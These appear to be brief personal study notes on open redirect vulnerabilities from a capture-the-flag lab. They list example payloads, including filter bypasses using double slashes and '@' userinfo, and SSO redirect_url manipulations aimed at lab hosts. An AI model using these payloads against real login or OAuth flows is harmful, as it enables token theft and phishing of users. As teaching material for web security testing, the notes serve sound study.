____

https://github.com/payloadbox/open-redirect-payload-list

```html
<a href="/?redirect=http://www.google.com">Google</a>
```

# Bypassing protections

![[Pasted image 20241130123503.png]]

```
?redirect=http://www.google.com.test
```

# SSO Example

![[Pasted image 20241130124246.png]]

![[Pasted image 20241130124308.png]]

```
https://auth.creon.ctfio.com/auth?client_id=1&redirect_url=https://creon.ctfio.com/redirect?uri=https://www.google.com&response_type=token
```

# Protections

Regex looking for //
```
https://auth.icarus.ctfio.com/auth?client_id=1&redirect_url=https://icarus.ctfio.com/x//www.google.com&response_type=token
```

Use the domain before the `@` as a fake username to redirect to the domain after the `@`

```
https://auth.daedalus.ctfio.com/auth?client_id=1&redirect_url=https://daedalus.ctfio.com@www.google.com/&response_type=token
```

# XSS



